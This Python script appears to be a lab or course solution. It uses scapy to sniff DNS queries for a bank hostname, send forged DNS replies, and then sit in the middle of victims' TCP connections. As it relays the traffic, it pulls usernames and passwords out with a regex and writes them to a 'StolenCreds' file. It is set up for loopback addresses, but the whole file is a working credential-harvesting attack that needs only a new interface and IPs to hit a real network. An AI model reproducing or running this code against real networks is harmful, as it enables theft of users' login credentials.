import os
import argparse
import socket
from subprocess import call
from scapy.all import *
import re

conf.L3socket = L3RawSocket
WEB_PORT = 8000
HOSTNAME = "LetumiBank.com"

def resolve_hostname(hostname):
	# IP address of HOSTNAME. Used to forward tcp connection.
	return "127.1.1.1"


def log_credentials(username, password):
	# Write stolen credentials out to file.
	with open("lib/StolenCreds.txt", "wb") as fd:
		fd.write(str.encode("Stolen credentials: username=" + username + " password=" + password))


def check_credentials(client_data):
	# Take a block of client data and search for username/password credentials.
	# If found, log the credentials to the system by calling log_credentials().)
		results = re.findall(r"username='(\w+)'&password='(\w+)", client_data)
		for result in results:
			log_credentials(*result)


def handle_tcp_forwarding(client_socket, client_ip, hostname):
	# Continuously intercept new connections from the client
	# and initiate a connection with the host in order to forward data
	while True:
		# accept a new connection from the client on client_socket and
		# create a new socket to connect to the actual host associated with hostname.
		conn, addr = client_socket.accept()
		address = (resolve_hostname(hostname), WEB_PORT)
		host_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		host_socket.connect(address)

		# read data from client socket, check for credentials, and forward along to host socket.
		data = conn.recv(16384)
		str_data = str(data)

		check_credentials(str_data)
		host_socket.send(data)
		
		ans = host_socket.recv(16384)
		conn.send(ans)

		host_socket.close()

		# if credentials was given - exit
		if "POST /post_logout" in str_data:
			conn.close()
			client_socket.close()
			exit()


def dns_callback(packet, extra_args):
	# Sends a spoofed DNS response for a query to HOSTNAME and calls handle_tcp_forwarding()
	# after successful spoof.
	source_ip, sock = extra_args
	if packet.haslayer(DNSQR) and HOSTNAME in str(packet[DNS].qd.qname):
		spf_resp =	IP(dst=packet[IP].src, src=packet[IP].dst)/                 \
					UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/      \
					DNS(id=packet[DNS].id, qd=packet[DNS].qd, an=				\
					DNSRR(rrname=packet[DNSQR].qname, rdata=source_ip), aa=1, qr=1)                                                 
		send(spf_resp)
		handle_tcp_forwarding(sock, packet[IP].src, HOSTNAME)
	

def sniff_and_spoof(source_ip):
	# Open a socket and bind it to the attacker's IP and WEB_PORT.
	# This socket will be used to accept connections from victimized clients.
	address = (source_ip, WEB_PORT)
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.bind(address)
	sock.listen()

	# sniff for DNS packets on the network
	sniff(prn=lambda p: dns_callback(p, (source_ip, sock)), filter='port 53 and udp', iface='lo')

def main():
	parser = argparse.ArgumentParser(description='Attacker who spoofs dns packet and hijacks connection')
	parser.add_argument('--source_ip', nargs='?', const=1, default="127.0.0.3", help='ip of the attacker')
	args = parser.parse_args()

	sniff_and_spoof(args.source_ip)


if __name__ == "__main__":
	# Change working directory to script's dir.
	abspath = os.path.abspath(__file__)
	dirname = os.path.dirname(abspath)
	os.chdir(dirname)
	main()
